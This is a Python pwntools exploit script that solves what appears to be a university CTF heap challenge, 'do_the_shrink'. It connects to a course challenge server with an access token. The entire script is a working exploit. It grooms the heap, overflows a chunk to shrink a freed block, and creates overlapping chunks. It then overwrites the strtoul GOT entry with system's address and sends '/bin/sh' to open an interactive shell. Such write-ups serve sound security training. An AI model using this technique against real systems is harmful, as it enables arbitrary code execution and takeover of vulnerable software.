#! /usr/bin/env python3
​
from pwn import *
​
binary_name = './do_the_shrink'
e = ELF(binary_name)
​
#for doing local debugging
is_local_dbg = True
gdb_script = '''
set pagination off
set disassembly-flavor intel
set follow-fork-mode parent
i proc mappings
​
b read_boot
command
heap
x/20gx &boots
x/140gx *(&boots)
end
​
c
'''
​
context.log_level ='error'
​
def create_new_boot(target, size, material):
    target.sendlineafter(b'> ', '1')
    target.sendlineafter(b'boot?', str(size))
    target.sendlineafter(b'of?', material)
​
def delete_boot(target, index):
    target.sendlineafter(b'> ', '2')
    target.sendlineafter(b'anymore?', str(index))
​
def read_boot(target, index):
	if(is_local_dbg):
		target.sendlineafter(b'> ', '3')
		target.sendlineafter(b'today?', str(index))
		print(target.recvuntil(b'1.'))
​
def edit_boot(target, index, material):
	target.sendlineafter(b'> ', '4')
	target.sendlineafter(b'today?', str(index))
	target.sendlineafter(b'boot?', material)
	
​
# We groom the heap so that our later chunks are properly aligned
def stage_0_groom_the_heap(target):
	create_new_boot(target, 0x20, '11111')
	create_new_boot(target, 0x20, '22222')
	create_new_boot(target, 0x20, '33333')
	delete_boot(target, 0)
	delete_boot(target, 0)
	delete_boot(target, 0)
​
	print('Stage 0: Heap Groomed')
	#read_boot(target, 0)
	#read_boot(target, 1)
	#read_boot(target, 2)
	
​
def stage_1_create_large_boots(target):
    #for debugging, lets read the boots here after stage
	create_new_boot(target, 0x108, b'A'*0x108) 	# Index 0: A 
	B_mat = b'B'*496 + p64(0x200) 				# 0x200 spoofs prev_size to get around unlink mitigation
	create_new_boot(target, 0x208, B_mat) 		# Index 1: B
	create_new_boot(target, 0x108, b'C'*0x108) 	# Index 2: C
	
	print('Stage 1: Large Boots Allocated')
	#read_boot(target, 0) # A
	#read_boot(target, 1) # B
	#read_boot(target, 2) # C
​
​
def stage_2_create_and_shrink(target):
	
	delete_boot(target, 1) # B @ index 1
	
	print('Stage 2a: Hole Created')
	#read_boot(target, 0) # A	
	#read_boot(target, 1) # C
	#read_boot(target, 2) # Ghost
​
	edit_boot(target, 0, b'a'*0x108) # Edit A to poison B block
​
	print('Stage 2b: Hole Overflowed')
	#read_boot(target, 0) # a aka A
	#read_boot(target, 1) # C
​
​
def stage_3_make_smaller_chunks_in_freed_block(target):
	
	create_new_boot(target, 0x108, b'E'*0x108)  # Index 2: E (B1)
	create_new_boot(target, 0x80, b'F'*0x80)	# Index 3: F (B2)
​
	print('Stage 3: Hole Overwritten')
	#read_boot(target, 2) # E aka B1
	#read_boot(target, 3) # F aka B2
​
​
def stage_4_free_blocks(target):
	
	#read_boot(target, 2) # E aka B1
	delete_boot(target,2) # Index 2 now B2
	#read_boot(target, 1) # C
	delete_boot(target,1)
​
	print('Stage 4: Last Boots Deleted')
	#read_boot(target, 0) # a
	#read_boot(target, 1) # F aka B2
	#read_boot(target, 2) # Ghost
​
​
def stage_5_create_overlapping_object(target):
	addr_strtoul    = p64(e.got['strtoul'])
	addr_system		= p64(e.symbols['system'])
	#addr_runcmd     = p64(e.symbols['run_cmd'])
​
	mat = b'D'*0x110 + addr_strtoul + p64(8) # 8 for the boot material size, which is strtoul's address, needed by edit_boot()
	create_new_boot(target, 0x140, mat)
​
	print('Stage 5a: Overlapping boot created')
	#read_boot(target, 1) # F aka B2
	#read_boot(target, 2) # D
​
	edit_boot(target, 1, addr_system) # Edits the strtoul GOT entry with system's address
​
	print('Stage 5b: using overlapping chunks to write')
​
​
def stage_6_run_binsh(target):
	target.sendline(b'/bin/sh') # Passes bin/sh to system through menu option input, which uses strtoul
	target.interactive()
	
​
def main():
​
	if(len(sys.argv) > 1 and sys.argv[1] == 'r'):
		print("Solving remote...")
		target = remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1346)
		target.recvuntil(b': ')
		target.sendline(b'ac7853')
		target.recvline()
		sleep(1)
	else:
		print("Solving local...")
		if(is_local_dbg):
			target = gdb.debug(binary_name, gdb_script)
		else:
			target = process(binary_name)
​
	stage_0_groom_the_heap(target)
	stage_1_create_large_boots(target)					# Allocate three consecutive chunks: A, B, C
	stage_2_create_and_shrink(target)					# Free B ; Overflow from A, making B.size smaller
	stage_3_make_smaller_chunks_in_freed_block(target)	# Allocate two new chunks, B1 and B2 in the free space
	stage_4_free_blocks(target)							# Free B1 and C
	stage_5_create_overlapping_object(target) 			# Allocate a final object D, overlapping with B2
	stage_6_run_binsh(target)							# Pass bin/sh to system
​
​
if __name__ == "__main__":
	main()
